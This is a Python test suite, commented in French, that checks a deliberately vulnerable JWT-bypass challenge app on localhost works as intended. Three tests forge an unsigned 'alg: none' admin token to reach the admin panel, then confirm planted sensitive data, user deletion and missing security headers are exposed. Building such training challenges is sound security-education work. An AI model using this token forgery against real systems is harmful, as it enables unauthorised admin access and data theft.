#!/usr/bin/env python3
"""
Test Suite pour JWT Authentication Bypass Challenge
Corporate Asset Management System

Exécutable: python build/app/tests/main.py
"""

import sys
import os
import requests
import time
import subprocess
import json
import base64

# Ajouter le répertoire parent pour les imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class JWTBypassTestSuite:
    def __init__(self):
        self.base_url = "http://localhost:3206"
        self.test_results = []
        self.failed_tests = 0
        self.passed_tests = 0
        self.app_process = None

    def start_application(self):
        """Démarrer l'application Flask en arrière-plan"""
        import subprocess
        import time
        
        # Changer vers le répertoire de l'application
        app_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        
        try:
            # Démarrer l'application en arrière-plan
            self.app_process = subprocess.Popen(
                [sys.executable, "app.py"],
                cwd=app_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0
            )
            
            # Attendre que l'application démarre
            print("⏳ Starting application...")
            time.sleep(3)
            
            # Vérifier que l'application répond
            for attempt in range(10):
                try:
                    response = requests.get(f"{self.base_url}/", timeout=2)
                    if response.status_code in [200, 302]:
                        print("✅ Application started successfully")
                        return True
                except:
                    time.sleep(1)
            
            print("❌ Application failed to start")
            return False
            
        except Exception as e:
            print(f"❌ Error starting application: {e}")
            return False

    def stop_application(self):
        """Arrêter l'application"""
        if self.app_process:
            try:
                self.app_process.terminate()
                self.app_process.wait(timeout=5)
            except:
                try:
                    self.app_process.kill()
                except:
                    pass

    def log_test(self, test_name, status, message=""):
        """Enregistrer le résultat d'un test"""
        result = {
            "test": test_name,
            "status": status,
            "message": message
        }
        self.test_results.append(result)
        
        if status == "PASS":
            print(f"✅ {test_name}: PASS {message}")
            self.passed_tests += 1
        else:
            print(f"❌ {test_name}: FAIL {message}")
            self.failed_tests += 1

    def test_application_startup(self):
        """Test 1: Vérifier que l'application démarre"""
        try:
            response = requests.get(f"{self.base_url}/", timeout=5)
            if response.status_code in [200, 302]:
                self.log_test("Application Startup", "PASS", f"Status: {response.status_code}")
                return True
            else:
                self.log_test("Application Startup", "FAIL", f"Unexpected status: {response.status_code}")
                return False
        except Exception as e:
            self.log_test("Application Startup", "FAIL", f"Connection error: {str(e)}")
            return False

    def test_login_page_access(self):
        """Test 2: Vérifier l'accès à la page de connexion"""
        try:
            response = requests.get(f"{self.base_url}/login", timeout=5)
            if response.status_code == 200 and "Corporate Asset Management" in response.text:
                self.log_test("Login Page Access", "PASS", "Login page accessible")
                return True
            else:
                self.log_test("Login Page Access", "FAIL", "Login page not accessible")
                return False
        except Exception as e:
            self.log_test("Login Page Access", "FAIL", f"Error: {str(e)}")
            return False

    def test_normal_authentication(self):
        """Test 3: Tester l'authentification normale"""
        try:
            login_data = {
                'username': 'mitchell.parker',
                'password': 'corporate2024'
            }
            
            session = requests.Session()
            response = session.post(f"{self.base_url}/login", data=login_data, allow_redirects=False)
            
            if response.status_code == 302:
                # Vérifier la présence du token JWT
                auth_token = None
                for cookie in session.cookies:
                    if cookie.name == 'auth_token':
                        auth_token = cookie.value
                        break
                
                if auth_token:
                    self.log_test("Normal Authentication", "PASS", "JWT token received")
                    return auth_token
                else:
                    self.log_test("Normal Authentication", "FAIL", "No JWT token in response")
                    return None
            else:
                self.log_test("Normal Authentication", "FAIL", f"Login failed: {response.status_code}")
                return None
        except Exception as e:
            self.log_test("Normal Authentication", "FAIL", f"Error: {str(e)}")
            return None

    def test_jwt_structure_analysis(self, jwt_token):
        """Test 4: Analyser la structure du JWT"""
        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                self.log_test("JWT Structure Analysis", "FAIL", f"Expected 3 parts, got {len(parts)}")
                return False
            
            # Décoder le header
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header_data = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Décoder le payload
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload_data = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            expected_fields = ['alg', 'typ']
            for field in expected_fields:
                if field not in header_data:
                    self.log_test("JWT Structure Analysis", "FAIL", f"Missing header field: {field}")
                    return False
            
            self.log_test("JWT Structure Analysis", "PASS", f"Valid JWT structure: alg={header_data['alg']}")
            return True
        except Exception as e:
            self.log_test("JWT Structure Analysis", "FAIL", f"Error: {str(e)}")
            return False

    def test_jwt_none_algorithm_bypass(self):
        """Test 5: Tester le bypass avec l'algorithme 'none'"""
        try:
            # Créer un JWT malicieux
            header = {"alg": "none", "typ": "JWT"}
            payload = {
                "sub": "administrator",
                "role": "admin",
                "department": "Management",
                "exp": int(time.time()) + 86400
            }
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            malicious_jwt = f"{header_b64}.{payload_b64}."
            
            # Tester l'accès admin
            cookies = {'auth_token': malicious_jwt}
            response = requests.get(f"{self.base_url}/admin", cookies=cookies, timeout=5)
            
            if response.status_code == 200 and "Administrator Panel" in response.text:
                self.log_test("JWT None Algorithm Bypass", "PASS", "Admin access achieved")
                return True
            else:
                self.log_test("JWT None Algorithm Bypass", "FAIL", f"Bypass failed: {response.status_code}")
                return False
        except Exception as e:
            self.log_test("JWT None Algorithm Bypass", "FAIL", f"Error: {str(e)}")
            return False

    def test_sensitive_data_exposure(self):
        """Test 6: Vérifier l'exposition de données sensibles"""
        try:
            # JWT malicieux pour accès admin
            header = {"alg": "none", "typ": "JWT"}
            payload = {
                "sub": "administrator",
                "role": "admin",
                "department": "Management",
                "exp": int(time.time()) + 86400
            }
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            malicious_jwt = f"{header_b64}.{payload_b64}."
            
            cookies = {'auth_token': malicious_jwt}
            response = requests.get(f"{self.base_url}/admin", cookies=cookies, timeout=5)
            
            # Vérifier les données sensibles
            sensitive_data = [
                "marcus.wellington@personal-gmail.com",
                "+1 (555) 847-2931",
                "1247 Oak Ridge Lane",
                "578-94-3265",
                "Corp2024!VPN#Secure"
            ]
            
            found_data = 0
            for data in sensitive_data:
                if data in response.text:
                    found_data += 1
            
            if found_data >= 3:
                self.log_test("Sensitive Data Exposure", "PASS", f"Found {found_data}/5 sensitive data items")
                return True
            else:
                self.log_test("Sensitive Data Exposure", "FAIL", f"Only found {found_data}/5 sensitive data items")
                return False
        except Exception as e:
            self.log_test("Sensitive Data Exposure", "FAIL", f"Error: {str(e)}")
            return False

    def test_user_deletion_capability(self):
        """Test 7: Tester la capacité de suppression d'utilisateurs"""
        try:
            # JWT malicieux pour accès admin
            header = {"alg": "none", "typ": "JWT"}
            payload = {
                "sub": "administrator",
                "role": "admin",
                "department": "Management",
                "exp": int(time.time()) + 86400
            }
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            malicious_jwt = f"{header_b64}.{payload_b64}."
            
            cookies = {'auth_token': malicious_jwt}
            
            # Vérifier que l'endpoint de suppression existe
            response = requests.get(f"{self.base_url}/admin", cookies=cookies, timeout=5)
            
            if "deleteUser" in response.text and "/admin/delete" in response.text:
                self.log_test("User Deletion Capability", "PASS", "Delete functionality accessible")
                return True
            else:
                self.log_test("User Deletion Capability", "FAIL", "Delete functionality not found")
                return False
        except Exception as e:
            self.log_test("User Deletion Capability", "FAIL", f"Error: {str(e)}")
            return False

    def test_security_headers(self):
        """Test 8: Vérifier les headers de sécurité"""
        try:
            response = requests.get(f"{self.base_url}/", timeout=5)
            
            security_issues = []
            
            # Vérifier l'absence de headers de sécurité (vulnérabilités attendues)
            if 'X-Frame-Options' not in response.headers:
                security_issues.append("Missing X-Frame-Options")
            
            if 'Content-Security-Policy' not in response.headers:
                security_issues.append("Missing CSP")
            
            if 'X-Content-Type-Options' not in response.headers:
                security_issues.append("Missing X-Content-Type-Options")
            
            if len(security_issues) >= 2:
                self.log_test("Security Headers", "PASS", f"Security gaps confirmed: {', '.join(security_issues)}")
                return True
            else:
                self.log_test("Security Headers", "FAIL", "Too many security headers present")
                return False
        except Exception as e:
            self.log_test("Security Headers", "FAIL", f"Error: {str(e)}")
            return False

    def run_all_tests(self):
        """Exécuter tous les tests"""
        print("🔥 JWT Authentication Bypass - Test Suite")
        print("=" * 60)
        print()
        
        # Test 1: Application startup
        if not self.test_application_startup():
            print("\n❌ Application not accessible. Tests cannot continue.")
            return False
        
        # Test 2: Login page
        self.test_login_page_access()
        
        # Test 3: Normal authentication
        jwt_token = self.test_normal_authentication()
        
        # Test 4: JWT structure
        if jwt_token:
            self.test_jwt_structure_analysis(jwt_token)
        
        # Test 5: JWT bypass
        self.test_jwt_none_algorithm_bypass()
        
        # Test 6: Sensitive data
        self.test_sensitive_data_exposure()
        
        # Test 7: User deletion
        self.test_user_deletion_capability()
        
        # Test 8: Security headers
        self.test_security_headers()
        
        return True

    def print_summary(self):
        """Afficher le résumé des tests"""
        print("\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {self.passed_tests + self.failed_tests}")
        print(f"Passed: {self.passed_tests}")
        print(f"Failed: {self.failed_tests}")
        
        if self.failed_tests == 0:
            print("\n🎉 ALL TESTS PASSED!")
            print("✅ JWT Bypass vulnerability is working correctly")
            print("✅ Challenge is ready for deployment")
        else:
            print(f"\n⚠️  {self.failed_tests} TEST(S) FAILED")
            print("❌ Some features may not be working correctly")
        
        success_rate = (self.passed_tests / (self.passed_tests + self.failed_tests)) * 100
        print(f"Success Rate: {success_rate:.1f}%")
        
        return self.failed_tests == 0

def main():
    """Point d'entrée principal"""
    print("Starting JWT Authentication Bypass Test Suite...")
    print("Target: http://localhost:3206")
    print()
    
    # Créer la suite de tests
    test_suite = JWTBypassTestSuite()
    
    # Démarrer l'application automatiquement
    if not test_suite.start_application():
        print("\n💥 Failed to start application!")
        return 1
    
    try:
        # Exécuter les tests
        if test_suite.run_all_tests():
            success = test_suite.print_summary()
            
            if success:
                print("\n🏆 Challenge validated successfully!")
                return 0
            else:
                print("\n❌ Challenge validation failed!")
                return 1
        else:
            print("\n💥 Test execution failed!")
            return 1
    finally:
        # Arrêter l'application
        test_suite.stop_application()

if __name__ == "__main__":
    exit(main())